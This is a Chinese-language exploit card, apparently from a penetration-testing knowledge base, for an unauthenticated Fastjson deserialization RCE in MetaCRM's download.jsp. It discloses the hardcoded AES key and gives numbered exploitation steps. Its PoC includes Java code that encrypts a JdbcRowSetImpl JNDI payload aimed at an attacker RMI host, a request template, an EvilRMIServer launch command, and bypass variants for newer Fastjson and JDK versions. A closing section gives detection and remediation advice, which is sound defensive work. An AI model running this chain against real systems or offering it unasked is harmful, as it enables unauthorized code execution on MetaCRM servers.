---
id: web-java-deser-fastjson-crm-download-jsp-aes-jdbcrowset-jndi
title: MetaCRM download.jsp AES 十六进制参数包裹的 Fastjson JdbcRowSetImpl JNDI RCE
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: crm-download-jsp-fastjson-jdbcrowset-jndi
aliases:
- MetaCRM Fastjson 反序列化
- download.jsp Fastjson RCE
- AnalyzeParam parseObject
- metacrmloginpass Fastjson
- JdbcRowSetImpl RMI
- AES 加密参数 Fastjson
tags:
- java
- fastjson
- deserialization
- jndi
- jdbcrowsetimpl
- aes
- crm
- unauth
- web
cve: []
severity: critical
confidence: high
affected_versions: MetaCRM 6.4.2（原文审计源码版本）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V235
  verified_at: '2026-11-07T09:35:21+08:00'
  notes: 已对照原文与图07/08/09/10核对：AnalyzeParam 在鉴权前构造、AesEcbCipher 硬编码 metacrmloginpass/AES-ECB-PKCS5/hex、JSONObject.parseObject JdbcRowSetImpl→RMI 回连 whoami 均一致；affected_versions 收敛为 MetaCRM 6.4.2；与18786路径穿越卡为同入口不同 sink，判 related 保留。未验证点：Fastjson 具体版本未知。frontmatter 无 sources/source_url。
---

## 一句话结论

MetaCRM 的 `/business/common/download.jsp` 在鉴权检查之前就把参数 `p` 交给 `AnalyzeParam`，后者用硬编码密钥 `metacrmloginpass` 做 AES/ECB 解密并直接 `JSONObject.parseObject` 解析；攻击者用该密钥加密 Fastjson `JdbcRowSetImpl` payload 并以十六进制提交，即可在未登录状态下触发 AutoType/JNDI 注入，原文通过恶意 RMI 服务收到回连并执行 `whoami`。

## 原理

- **入口位置**：`download.jsp` 先取 `p`，`new AnalyzeParam(downUrl)` 在 session/用户检查之前执行；因此反序列化 sink 是前台可达的。后续文件读取部分才依赖 `UserState`/`getCorpName()`（原文称“前台 Fastjson 反序列化 + 后台任意文件读取”）。
- **加密层**：`AnalyzeParam` 构造函数执行 `AesEcbCipher aec = new AesEcbCipher(); this.param = JSONObject.parseObject(aec.decrypt(param));`。`AesEcbCipher` 硬编码 `SECRET_KEY = "metacrmloginpass"`，算法 `AES/ECB/PKCS5Padding`，`decrypt` 用 `Hex.decodeHex`，所以 `p` 是 AES 密文的十六进制字符串；加密层不是安全边界，攻击者可复现。
- **Fastjson sink**：解密后的字符串直接进 `JSONObject.parseObject`，没有 schema/字段白名单。目标项目为普通 JavaWeb/MetaCRM，使用 fastjson；原文未明确版本，但 payload 成功触发 `@type` 解析，说明 AutoType/缓存绕过可用（常见于 1.2.4x 及更早版本）。
- **JNDI 链**：payload 使用 `com.sun.rowset.JdbcRowSetImpl`，设置 `dataSourceName` 指向攻击者 RMI/LDAP 服务，并设置 `autoCommit=true`。反序列化时 setter 触发 `connect()`，`connect()` 对 `dataSourceName` 做 JNDI lookup；攻击者服务返回恶意 Reference/序列化对象，目标加载后执行代码。原文用 `jndi_tool.jar` 的 `jndi.EvilRMIServer 1099 8888 "whoami"` 起 RMI 服务，日志显示收到目标连接并下发恶意代码。
- **原文 payload 形态**：截图中的 payload 为 `{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://.../Object","autoCommit":true}}""}`（外层 JSONObject 包裹，原文原样使用并成功回连）；标准等价形态见 PoC。
- **JDK 边界**：高版本 JDK（8u191+/11+）默认限制 LDAP/RMI 远程 codebase，需要改用本地 gadget、LDAP 本地工厂或更高版本绕过；原文的回连说明目标环境允许其利用链。

## 触发条件

- 目标部署 MetaCRM，`/business/common/download.jsp` 可从攻击面访问。
- `AnalyzeParam`/`AesEcbCipher` 的硬编码密钥与算法可获取（源码/反编译 jar），或能从已知信息推出。
- Fastjson 允许 AutoType/存在缓存绕过，且 `JSONObject.parseObject` 使用默认配置。
- 目标可出网访问攻击者 RMI/LDAP 服务；JDK/安全策略允许对应 JNDI 远程加载，或存在本地 gadget。
- 无需登录即可到达反序列化 sink（原文将该点标为前台）。

## 利用步骤

1. 从源码/反编译确认 `AesEcbCipher` 密钥 `metacrmloginpass`、`AES/ECB/PKCS5Padding`、hex 编码，以及 `AnalyzeParam` 在鉴权前构造。
2. 启动恶意 RMI/LDAP 服务（原文用 jndi_tool 的 `EvilRMIServer`），准备命令执行 payload。
3. 构造 Fastjson payload：标准形态 `{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker:1099/Object","autoCommit":true}`；若目标版本需要 `java.lang.Class` 缓存绕过，可加 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` 或使用 1.2.47 双对象 payload。
4. 用 `metacrmloginpass` 做 AES/ECB/PKCS5Padding 加密，输出十六进制字符串（Java `Hex.encodeHexString` 或 CyberChef AES Encrypt + Hex）。
5. 发送 `GET /business/common/download.jsp?p=<hex>`；观察 RMI/LDAP 服务是否收到连接与目标下发请求。
6. 在恶意服务端执行 `whoami`/`id` 等无害命令验证代码执行；授权测试中只做回连与只读命令。
7. 若目标 JDK 限制远程 codebase，改用本地 gadget/高版本 JNDI 绕过，或退回其他 sink。

## PoC

加密脚本（与 `AesEcbCipher.encrypt` 对应，输出 hex）：

```java
String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
               + "\"dataSourceName\":\"rmi://attacker:1099/Object\",\"autoCommit\":true}";
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec("metacrmloginpass".getBytes("UTF-8"), "AES"));
String p = org.apache.commons.codec.binary.Hex.encodeHexString(c.doFinal(payload.getBytes("UTF-8")));
```

请求：

```http
GET /business/common/download.jsp?p=<hex> HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Connection: close
```

恶意 RMI 服务（原文）：

```bash
java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "whoami"
# 目标回连后日志出现 Have connection / Start send evil code
```

## 变体与关联

- 变体：Fastjson 版本不同可用 `java.lang.Class` 缓存、ExpectClass、异常缓存等绕过；payload 可用 `ldap://` 代替 `rmi://`。
- 变体：同接口还可用同一 AES 参数做任意文件读取（需后台会话），见关联卡。
- 关联：[[web-java-deser-fastjson-encrypted-param-aes-wrapper]]（加密参数 + Fastjson 的通用链，本卡是其 MetaCRM 的 hex AES-ECB 实例）、[[web-java-deser-fastjson-jdbc-rowset]]（JdbcRowSetImpl JNDI 通用 payload）、[[web-generic-file-inclusion-crm-download-jsp-aes-path-traversal]]（同 `download.jsp` 的 AES 参数路径穿越文件读取）。
- 边界：target JDK 高版本可能限制远程 codebase；Fastjson 版本/配置未知；需出网。原文未给出目标 JDK 版本。

## 检测与防御

- 检测：`download.jsp` 的 `p` 参数为高熵十六进制；解密后出现 `@type`、`JdbcRowSetImpl`、`dataSourceName`、`rmi://`/`ldap://`；目标进程发起 RMI/LDAP 出站；`AnalyzeParam`/`parseObject` 调用前后出现反序列化异常。
- 修复：升级 Fastjson 并开启 SafeMode/关闭 AutoType；`JSONObject.parseObject` 改为指定业务 DTO 类型并做字段白名单；不要把解密后的 JSON 直接反序列化。
- 加固：网络层限制 RMI/LDAP 出站；WAF 对解密后的内容做检测（需能解密）；密钥不要硬编码；JNDI 关闭远程 codebase（`com.sun.jndi.ldap.object.trustURLCodebase=false` 等）。
